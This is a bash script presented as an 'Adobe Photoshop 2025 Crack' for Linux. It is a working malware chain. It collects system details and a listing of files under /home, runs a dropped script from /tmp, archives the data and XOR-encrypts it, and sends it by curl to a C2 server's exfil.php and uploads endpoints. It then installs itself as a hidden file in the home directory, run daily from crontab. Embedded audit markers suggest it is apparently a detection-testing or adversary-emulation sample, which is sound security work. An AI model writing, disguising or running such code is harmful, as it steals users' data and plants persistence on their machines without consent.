#!/bin/bash
# ============================================================
# Adobe Photoshop 2025 Crack - Linux (markers embedded in bash -c arguments)
# Marker được truyền như argv[1] của bash -c, không ảnh hưởng đến lệnh chính
# ============================================================

RUN_ID=$(cat /dev/urandom | tr -dc 'a-f0-9' | fold -w 8 | head -n 1)
C2_SERVER="http://192.168.10.105"
EXFIL_ENDPOINT="/exfil.php"
PERSISTENCE_NAME="adobe_update"
STAGING_DIR="/tmp/.adobe_crack_$RUN_ID"
mkdir -p "$STAGING_DIR"

GREEN='\033[0;32m'
CYAN='\033[0;36m'
GRAY='\033[0;90m'
NC='\033[0m'

# ============================================================
# PHASE 1: System Information Discovery
# ============================================================
phase1() {
    local PHASE_ID=$(cat /dev/urandom | tr -dc 'a-f0-9' | fold -w 6 | head -n 1)
    echo -e "\n${CYAN}[PHASE 1] System Information Discovery...${NC}"
    echo -e "${GRAY}  RunId: $PHASE_ID${NC}"
    bash -c 'uname -a; hostname; lscpu; lsmod' "MARKER_PHASE1_${RUN_ID}" > "$STAGING_DIR/system_info.txt" 2>&1
    echo -e "${GREEN}  [+] System information collected${NC}"
    sleep 2
}

# ============================================================
# PHASE 2: File & Directory Discovery
# ============================================================
phase2() {
    local PHASE_ID=$(cat /dev/urandom | tr -dc 'a-f0-9' | fold -w 6 | head -n 1)
    echo -e "\n${CYAN}[PHASE 2] File and Directory Discovery...${NC}"
    echo -e "${GRAY}  RunId: $PHASE_ID${NC}"
    bash -c 'find /home -type f 2>/dev/null | head -20; ls -R /tmp 2>/dev/null | head -30' "MARKER_PHASE2_${RUN_ID}" > "$STAGING_DIR/discovery.txt" 2>&1
    echo -e "${GREEN}  [+] File discovery completed${NC}"
    sleep 2
}

# ============================================================
# PHASE 3: Script Execution from /tmp
# ============================================================
phase3() {
    local PHASE_ID=$(cat /dev/urandom | tr -dc 'a-f0-9' | fold -w 6 | head -n 1)
    echo -e "\n${CYAN}[PHASE 3] Executing script from /tmp...${NC}"
    echo -e "${GRAY}  RunId: $PHASE_ID${NC}"
    local TMP_SCRIPT="/tmp/.system_update_$PHASE_ID.sh"
    cat > "$TMP_SCRIPT" <<'EOF'
#!/bin/bash
echo "[*] Running from /tmp directory"
hostname; whoami; date
EOF
    chmod +x "$TMP_SCRIPT"
    bash -c "$TMP_SCRIPT" "MARKER_PHASE3_${RUN_ID}" > "$STAGING_DIR/script_output.txt" 2>&1
    bash -c "echo 'Running from /tmp' > /tmp/test.txt && cat /tmp/test.txt" "MARKER_PHASE3_${RUN_ID}_2" >> "$STAGING_DIR/script_output.txt" 2>&1
    echo -e "${GREEN}  [+] Script executed from /tmp${NC}"
    sleep 2
}

# ============================================================
# PHASE 4: Data Compression
# ============================================================
phase4() {
    local PHASE_ID=$(cat /dev/urandom | tr -dc 'a-f0-9' | fold -w 6 | head -n 1)
    echo -e "\n${CYAN}[PHASE 4] Compressing collected data...${NC}"
    echo -e "${GRAY}  RunId: $PHASE_ID${NC}"
    echo "dummy" > "$STAGING_DIR/dummy.txt"
    bash -c 'tar -czf "$1/collected_data.tar.gz" -C "$1" . 2>/dev/null' _ "MARKER_PHASE4_${RUN_ID}" "$STAGING_DIR"
    gzip -k "$STAGING_DIR/system_info.txt" 2>/dev/null || true
    echo -e "${GREEN}  [+] Data compressed${NC}"
    sleep 2
}

# ============================================================
# PHASE 5: C2 Exfiltration via Curl (marker in URL/data)
# ============================================================
phase5() {
    local PHASE_ID=$(cat /dev/urandom | tr -dc 'a-f0-9' | fold -w 6 | head -n 1)
    echo -e "\n${CYAN}[PHASE 5] Exfiltrating data via curl...${NC}"
    echo -e "${GRAY}  RunId: $PHASE_ID${NC}"
    if [[ ! -f "$STAGING_DIR/collected_data.tar.gz" ]]; then
        echo "dummy" > "$STAGING_DIR/dummy.txt"
        tar -czf "$STAGING_DIR/collected_data.tar.gz" -C "$STAGING_DIR" dummy.txt 2>/dev/null
    fi

    # Build encrypted JSON payload khớp với exfil.php (XOR key=0x42)
    local PAYLOAD_JSON
    PAYLOAD_JSON=$(python3 -c "
import json, base64, socket, os
hostname = socket.gethostname()
username = os.environ.get('USER', os.environ.get('LOGNAME', 'unknown'))
with open('$STAGING_DIR/collected_data.tar.gz', 'rb') as f:
    content_b64 = base64.b64encode(f.read()).decode()
inner = json.dumps({'victim_id': hostname, 'username': username, 'run_id': '$RUN_ID', 'phase_id': '$PHASE_ID', 'data_type': 'full_archive', 'content': content_b64})
encrypted = bytes([b ^ 0x42 for b in inner.encode()])
print(json.dumps({'data': base64.b64encode(encrypted).decode()}))
" 2>/dev/null)

    # Marker beacon — pattern giống phase 1-4 (MARKER là argv[1] của bash -c, auditd ghi rõ)
    bash -c 'curl -s -d "run_id=$1&status=exfil" "$2/track.php" --max-time 5 > /dev/null 2>&1' \
        "MARKER_PHASE5_${RUN_ID}" "$RUN_ID" "$C2_SERVER"

    # Exfil chính: encrypted JSON POST tới exfil.php
    curl -s -X POST "${C2_SERVER}/exfil.php" \
        -H "Content-Type: application/json" \
        -d "$PAYLOAD_JSON" \
        --max-time 10 > /dev/null 2>&1

    # Backup upload raw binary
    curl -s --upload-file "$STAGING_DIR/collected_data.tar.gz" \
        "${C2_SERVER}/uploads/${RUN_ID}" \
        --max-time 5 > /dev/null 2>&1

    echo -e "${GREEN}  [+] Data exfiltration executed (curl to C2 exfil.php)${NC}"
    sleep 2
}

# ============================================================
# PHASE 6: Persistence via Crontab
# ============================================================
phase6() {
    local PHASE_ID=$(cat /dev/urandom | tr -dc 'a-f0-9' | fold -w 6 | head -n 1)
    echo -e "\n${CYAN}[PHASE 6] Installing persistence via crontab...${NC}"
    echo -e "${GRAY}  RunId: $PHASE_ID${NC}"
    
    # Xác định thư mục home: nếu là root thì dùng /root, ngược lại dùng $HOME
    if [ "$EUID" -eq 0 ]; then
        REAL_HOME="/root"
    else
        REAL_HOME="$HOME"
    fi
    local PERSISTENT_PATH="$REAL_HOME/.$PERSISTENCE_NAME.sh"
    
    cp "$0" "$PERSISTENT_PATH" 2>/dev/null || cp "$(readlink -f $0)" "$PERSISTENT_PATH" 2>/dev/null
    chmod +x "$PERSISTENT_PATH"
    
    local CRON_JOB="0 0 * * * $PERSISTENT_PATH --run-id $RUN_ID > /dev/null 2>&1"
    bash -c '(crontab -l 2>/dev/null | grep -v "$1"; echo "$2") | crontab -' "MARKER_PHASE6_${RUN_ID}" "$PERSISTENCE_NAME" "$CRON_JOB"
    
    echo -e "${GREEN}  [+] Persistence installed via crontab (script at $PERSISTENT_PATH)${NC}"
    sleep 2
}
# ============================================================
# CLEANUP
# ============================================================
cleanup() {
    echo -e "\n${GRAY}Cleaning up temporary files...${NC}"
    rm -f "/tmp/.system_update_*" 2>/dev/null
    rm -f "/tmp/test.txt" 2>/dev/null
}

# ============================================================
# MAIN
# ============================================================
echo -e "\n${GREEN}╔════════════════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║     Adobe Photoshop 2025 Crack - Linux (full markers)       ║${NC}"
echo -e "${GREEN}║     Run ID: $RUN_ID${NC}"
echo -e "${GREEN}╚════════════════════════════════════════════════════════════╝${NC}"

phase1
phase2
phase3
phase4
phase5
phase6
cleanup

echo -e "\n${GREEN}╔════════════════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║  LINUX FULL ATTACK CHAIN COMPLETED                      ║${NC}"
echo -e "${GREEN}║  Run ID: $RUN_ID${NC}"
echo -e "${GREEN}╚════════════════════════════════════════════════════════════╝${NC}"